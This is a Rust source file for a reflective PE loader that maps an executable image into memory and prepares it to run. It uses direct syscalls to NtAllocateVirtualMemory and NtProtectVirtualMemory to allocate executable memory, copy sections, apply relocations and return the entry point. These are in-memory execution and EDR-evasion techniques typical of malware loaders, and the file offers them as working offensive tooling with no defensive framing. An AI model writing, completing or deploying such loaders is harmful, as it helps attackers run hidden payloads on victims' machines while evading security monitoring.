//! loader.rs — Reflective PE loader using direct syscalls
#![allow(dead_code, non_snake_case)]

use crate::defs::NT_SUCCESS;
use crate::syscall::do_syscall;

const MEM_COMMIT_RESERVE:     usize = 0x3000;
const PAGE_EXECUTE_READWRITE: usize = 0x40;
const PAGE_EXECUTE_READ:      usize = 0x20;
const CURRENT_PROCESS:        usize = usize::MAX;

pub unsafe fn load_pe(pe_bytes: &[u8]) -> Option<usize> {
    if pe_bytes.len() < 0x40 { return None; }
    let base = pe_bytes.as_ptr();

    // DOS signature check
    if (base as *const u16).read_unaligned() != 0x5A4D { return None; }

    let e_lfanew      = (base.add(0x3C) as *const u32).read_unaligned() as usize;
    if e_lfanew + 0x100 > pe_bytes.len() { return None; }
    let nt            = base.add(e_lfanew);

    // PE signature check
    if (nt as *const u32).read_unaligned() != 0x00004550 { return None; }

    let opt_off       = e_lfanew + 0x18;          // start of Optional Header
    let size_of_image = (base.add(opt_off + 0x38) as *const u32).read_unaligned() as usize;
    let ep_rva        = (base.add(opt_off + 0x10) as *const u32).read_unaligned() as usize;
    let img_base_pref = (base.add(opt_off + 0x18) as *const u64).read_unaligned() as usize;
    // SizeOfHeaders is at OptionalHeader+0x3C
    let headers_size  = (base.add(opt_off + 0x3C) as *const u32).read_unaligned() as usize;

    let ssn_alloc = crate::syscall::resolve_ssn("NtAllocateVirtualMemory").unwrap_or(0);
    let mut alloc_base: usize = img_base_pref;
    let mut alloc_size: usize = size_of_image;

    let st = do_syscall(
        ssn_alloc,
        CURRENT_PROCESS,
        &mut alloc_base as *mut usize as usize,
        0,
        &mut alloc_size as *mut usize as usize,
        MEM_COMMIT_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if !NT_SUCCESS(st) {
        alloc_base = 0;
        alloc_size = size_of_image;
        let st2 = do_syscall(
            ssn_alloc,
            CURRENT_PROCESS,
            &mut alloc_base as *mut usize as usize,
            0,
            &mut alloc_size as *mut usize as usize,
            MEM_COMMIT_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if !NT_SUCCESS(st2) { return None; }
    }

    let mapped = alloc_base as *mut u8;

    // Copy headers
    let hdr_copy = headers_size.min(pe_bytes.len());
    core::ptr::copy_nonoverlapping(base, mapped, hdr_copy);

    // Copy sections
    let num_sections = (nt.add(0x06) as *const u16).read_unaligned() as usize;
    let opt_size     = (nt.add(0x14) as *const u16).read_unaligned() as usize;
    let sec_start    = nt.add(0x18 + opt_size);

    for i in 0..num_sections {
        let sec        = sec_start.add(i * 0x28);
        let virt_rva   = (sec.add(0x0C) as *const u32).read_unaligned() as usize;
        let raw_offset = (sec.add(0x14) as *const u32).read_unaligned() as usize;
        let raw_size   = (sec.add(0x10) as *const u32).read_unaligned() as usize;
        if raw_size == 0 { continue; }
        if raw_offset + raw_size > pe_bytes.len() { continue; }
        if virt_rva + raw_size > size_of_image { continue; }
        core::ptr::copy_nonoverlapping(
            base.add(raw_offset),
            mapped.add(virt_rva),
            raw_size,
        );
    }

    // Base relocations
    let delta = alloc_base.wrapping_sub(img_base_pref) as isize;
    if delta != 0 {
        // DataDirectory[5]: Base Relocation Table
        let reloc_rva  = (base.add(opt_off + 0x68) as *const u32).read_unaligned() as usize;
        let reloc_size = (base.add(opt_off + 0x6C) as *const u32).read_unaligned() as usize;
        if reloc_rva != 0 && reloc_size != 0 {
            let mut off = 0usize;
            while off + 8 <= reloc_size {
                let block    = mapped.add(reloc_rva + off);
                let page_rva = (block as *const u32).read_unaligned() as usize;
                let block_sz = (block.add(4) as *const u32).read_unaligned() as usize;
                if block_sz < 8 { break; }
                let entries  = (block_sz - 8) / 2;
                for e in 0..entries {
                    let entry = (block.add(8 + e * 2) as *const u16).read_unaligned();
                    let kind  = entry >> 12;
                    let rva   = (entry & 0x0FFF) as usize;
                    if kind == 10 {
                        let target = mapped.add(page_rva + rva) as *mut isize;
                        *target = (*target).wrapping_add(delta);
                    }
                }
                off += block_sz;
            }
        }
    }

    // Re-protect to RX: NtProtectVirtualMemory(proc, &base, &size, prot, &old)
    let ssn_prot = crate::syscall::resolve_ssn("NtProtectVirtualMemory").unwrap_or(0);
    let mut prot_base = alloc_base;
    let mut prot_size = size_of_image;
    let mut old_prot: u32 = 0;
    do_syscall(
        ssn_prot,
        CURRENT_PROCESS,
        &mut prot_base as *mut usize as usize,
        &mut prot_size as *mut usize as usize,
        PAGE_EXECUTE_READ,
        &mut old_prot as *mut u32 as usize,
        0,
    );

    Some(alloc_base + ep_rva)
}
